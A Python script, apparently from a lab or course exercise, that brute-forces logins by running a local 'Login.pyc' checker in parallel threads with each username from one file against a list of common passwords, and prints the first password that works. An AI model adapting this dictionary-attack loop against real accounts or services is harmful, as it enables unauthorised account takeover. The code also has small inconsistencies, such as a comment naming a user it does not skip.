import os
import time
import subprocess
import threading

found = False
stop_event = threading.Event()
lock = threading.Lock()

d = open("gang", encoding="utf8")
Names = [line.rstrip('\n') for line in d]
f = open("MostCommonPWs", encoding="utf8")
Passwords = [line.rstrip('\n') for line in f]
start = time.ctime(time.time())
print("Start Time: ", start)

def threadin(nme):
    global found
    for pwd in Passwords:
        output = subprocess.run(["python3", "Login.pyc", nme, pwd], capture_output = True, text = True).stdout.strip("\n")
        if "success" in output:
            with lock:
                if not found:
                    found = True
                    stop_event.set()
                    print("The Working Password For ", nme,"Is", pwd)
                    end = time.ctime(time.time())
                    print("End Time: ", end)
                break
        elif pwd == "qqww1122":
            stop_event.set()
            break
            
threads = []
for nme in reversed(Names):
    # Skip Al and Adam
    if nme == "Adam":
        continue
    else:
        # Create a new thread for each name (nme)
        thread = threading.Thread(target=threadin, args=(nme,))
        threads.append(thread)
        # Start the thread
        thread.start()

stop_event.wait()
for thread in threads:
    thread.join()